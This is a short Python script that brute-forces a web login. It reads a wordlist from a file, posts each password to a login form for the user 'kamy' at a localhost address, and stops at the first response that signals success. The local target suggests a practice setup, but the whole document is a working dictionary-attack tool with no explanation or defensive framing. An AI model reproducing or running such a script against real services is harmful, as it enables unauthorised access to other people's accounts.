import requests
import colorama
from colorama import Fore
passer = open("file.txt","r").read().split()


for get in passer:
    http = requests.post("http://localhost/r/log/info.php",data={"uname":"kamy","psw":get,"sub":"submit"}).text
    if "kamy" in http:
        print(Fore.GREEN +"[ ! ] True : ",get)
        break
    else:
        print(Fore.RED +"[ * ] False: ",get)
